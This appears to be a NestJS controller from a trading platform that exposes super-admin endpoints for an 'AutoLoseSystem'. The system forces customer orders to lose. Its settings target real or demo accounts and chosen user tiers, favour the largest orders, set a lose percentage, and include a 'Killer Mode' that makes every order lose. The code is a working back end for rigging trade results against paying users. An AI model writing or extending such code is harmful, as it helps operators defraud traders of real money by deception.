// src/auto-lose-system/auto-lose-system.controller.ts

import {
  Controller,
  Get,
  Put,
  Post,
  Body,
  Query,
  UseGuards,
  HttpCode,
  HttpStatus,
} from '@nestjs/common';
import {
  ApiTags,
  ApiOperation,
  ApiBearerAuth,
  ApiResponse,
  ApiQuery,
} from '@nestjs/swagger';
import { JwtAuthGuard } from '../auth/guards/jwt-auth.guard';
import { RolesGuard } from '../auth/guards/roles.guard';
import { Roles } from '../auth/decorators/roles.decorator';
import { CurrentUser } from '../common/decorators/user.decorator';
import { USER_ROLES } from '../common/constants';
import { AutoLoseSystemService } from './auto-lose-system.service';
import {
  UpdateAutoLoseConfigDto,
  ToggleAutoLoseDto,
  ToggleKillerModeDto,
} from './dto/update-auto-lose-config.dto';

@ApiTags('auto-lose-system')
@Controller('auto-lose-system')
@UseGuards(JwtAuthGuard, RolesGuard)
@ApiBearerAuth()
export class AutoLoseSystemController {
  constructor(private readonly autoLoseService: AutoLoseSystemService) {}

  // ============================================================
  // GET STATUS & CONFIG
  // ============================================================

  @Get('status')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @ApiOperation({
    summary: 'Get AutoLoseSystem status & config (Super Admin only)',
    description:
      'Menampilkan konfigurasi aktif, statistik tracker order per window, dan info sistem.',
  })
  @ApiResponse({
    status: 200,
    description: 'Status retrieved successfully',
    schema: {
      example: {
        success: true,
        data: {
          config: {
            id: 'global_config',
            isEnabled: true,
            killerMode: false,
            targetAccountType: 'both',
            targetUserStatus: ['standard', 'gold', 'vip'],
            minOrderAmount: null,
            maxOrderAmount: null,
            priorityMode: 'highest_amount',
            losePercentage: 100,
            updatedAt: '2024-01-01T00:00:00.000Z',
            updatedByEmail: 'superadmin@trading.com',
          },
          trackerStats: {
            activeWindows: 5,
            totalTrackedOrders: 23,
            windows: [
              {
                windowKey: 'w1706784000_real',
                orderCount: 8,
                totalAmount: 2500000,
                topAmount: 500000,
              },
            ],
          },
        },
      },
    },
  })
  async getStatus() {
    return this.autoLoseService.getStatus();
  }

  @Get('config')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @ApiOperation({
    summary: 'Get AutoLoseSystem configuration (Super Admin only)',
    description: 'Ambil konfigurasi lengkap AutoLoseSystem.',
  })
  @ApiResponse({ status: 200, description: 'Config retrieved successfully' })
  async getConfig() {
    return this.autoLoseService.getConfig();
  }

  @Get('logs')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @ApiOperation({
    summary: 'Get AutoLose execution logs (Super Admin only)',
    description: 'Riwayat order yang telah di-force lose oleh sistem.',
  })
  @ApiQuery({ name: 'page', required: false, type: Number, example: 1 })
  @ApiQuery({ name: 'limit', required: false, type: Number, example: 50 })
  @ApiResponse({ status: 200, description: 'Logs retrieved successfully' })
  async getLogs(
    @Query('page') page: number = 1,
    @Query('limit') limit: number = 50,
  ) {
    return this.autoLoseService.getLogs(page, limit);
  }

  // ============================================================
  // UPDATE CONFIG
  // ============================================================

  @Put('config')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @HttpCode(HttpStatus.OK)
  @ApiOperation({
    summary: 'Update AutoLoseSystem full configuration (Super Admin only)',
    description: `Perbarui konfigurasi AutoLoseSystem:

**Pengaturan Target:**
- **targetAccountType**: Pilih akun yang dimanipulasi: \`demo\`, \`real\`, atau \`both\`
- **targetUserStatus**: Pilih status user yang menjadi target: \`standard\`, \`gold\`, \`vip\`
- **minOrderAmount**: Minimum amount order yang kena (null = tanpa batas minimum)
- **maxOrderAmount**: Maximum amount order yang kena (null = tanpa batas maksimum)

**Pengaturan Prioritas:**
- **priorityMode**: \`highest_amount\` = order dengan amount terbesar di-lose duluan, \`all\` = semua order yang lolos filter langsung lose
- **losePercentage**: Berapa % order yang di-lose (dari yang terbesar). 100 = semua, 50 = 50% terbesar

**Mode Khusus:**
- **killerMode**: Jika true, SEMUA order yang masuk akan LOSE tanpa memperhatikan filter apapun`,
  })
  @ApiResponse({ status: 200, description: 'Config updated successfully' })
  async updateConfig(
    @Body() dto: UpdateAutoLoseConfigDto,
    @CurrentUser('sub') adminId: string,
    @CurrentUser('email') adminEmail: string,
  ) {
    return this.autoLoseService.updateConfig(dto, adminId, adminEmail);
  }

  // ============================================================
  // TOGGLE ENDPOINTS (convenience)
  // ============================================================

  @Post('toggle')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @HttpCode(HttpStatus.OK)
  @ApiOperation({
    summary: 'Toggle AutoLoseSystem ON/OFF (Super Admin only)',
    description:
      'Aktifkan atau nonaktifkan sistem AutoLose secara cepat tanpa mengubah pengaturan lain.',
  })
  @ApiResponse({
    status: 200,
    description: 'AutoLoseSystem toggled successfully',
    schema: {
      example: {
        success: true,
        data: {
          message: 'AutoLoseSystem is now ENABLED',
          config: {
            isEnabled: true,
            killerMode: false,
          },
        },
      },
    },
  })
  async toggle(
    @Body() dto: ToggleAutoLoseDto,
    @CurrentUser('sub') adminId: string,
    @CurrentUser('email') adminEmail: string,
  ) {
    const config = await this.autoLoseService.toggleEnabled(
      dto.isEnabled,
      adminId,
      adminEmail,
    );

    return {
      message: `AutoLoseSystem is now ${config.isEnabled ? 'ENABLED ⚡' : 'DISABLED ✅'}`,
      config: {
        isEnabled: config.isEnabled,
        killerMode: config.killerMode,
        targetAccountType: config.targetAccountType,
        targetUserStatus: config.targetUserStatus,
        minOrderAmount: config.minOrderAmount,
        maxOrderAmount: config.maxOrderAmount,
        priorityMode: config.priorityMode,
        losePercentage: config.losePercentage,
        updatedAt: config.updatedAt,
      },
    };
  }

  @Post('killer-mode')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @HttpCode(HttpStatus.OK)
  @ApiOperation({
    summary: 'Toggle Killer Mode (Super Admin only)',
    description: `⚠️ **BAHAYA**: Killer Mode akan membuat SEMUA order yang masuk menjadi LOSE,
tanpa memperhatikan pengaturan targetAccountType, targetUserStatus, atau filter amount apapun.
Killer Mode aktif hanya ketika isEnabled = true.`,
  })
  @ApiResponse({
    status: 200,
    description: 'Killer Mode toggled successfully',
    schema: {
      example: {
        success: true,
        data: {
          message: 'Killer Mode is now ACTIVE ☠️',
          config: {
            isEnabled: true,
            killerMode: true,
          },
        },
      },
    },
  })
  async toggleKillerMode(
    @Body() dto: ToggleKillerModeDto,
    @CurrentUser('sub') adminId: string,
    @CurrentUser('email') adminEmail: string,
  ) {
    const config = await this.autoLoseService.toggleKillerMode(
      dto.killerMode,
      adminId,
      adminEmail,
    );

    return {
      message: config.killerMode
        ? 'Killer Mode ACTIVE ☠️ — Semua order akan LOSE!'
        : 'Killer Mode DEACTIVATED ✅',
      config: {
        isEnabled: config.isEnabled,
        killerMode: config.killerMode,
        updatedAt: config.updatedAt,
      },
    };
  }

  @Post('reset')
  @Roles(USER_ROLES.SUPER_ADMIN)
  @HttpCode(HttpStatus.OK)
  @ApiOperation({
    summary: 'Reset AutoLoseSystem to default config (Super Admin only)',
    description: 'Reset semua pengaturan ke nilai default (disabled, no killer mode).',
  })
  @ApiResponse({ status: 200, description: 'Config reset to default' })
  async resetToDefault(
    @CurrentUser('sub') adminId: string,
    @CurrentUser('email') adminEmail: string,
  ) {
    const defaultDto: UpdateAutoLoseConfigDto = {
      isEnabled: false,
      killerMode: false,
      targetAccountType: 'both',
      targetUserStatus: ['standard', 'gold', 'vip'],
      minOrderAmount: null,
      maxOrderAmount: null,
      priorityMode: 'highest_amount',
      losePercentage: 100,
    };

    const config = await this.autoLoseService.updateConfig(
      defaultDto,
      adminId,
      adminEmail,
    );

    return {
      message: 'AutoLoseSystem reset to default configuration',
      config,
    };
  }
}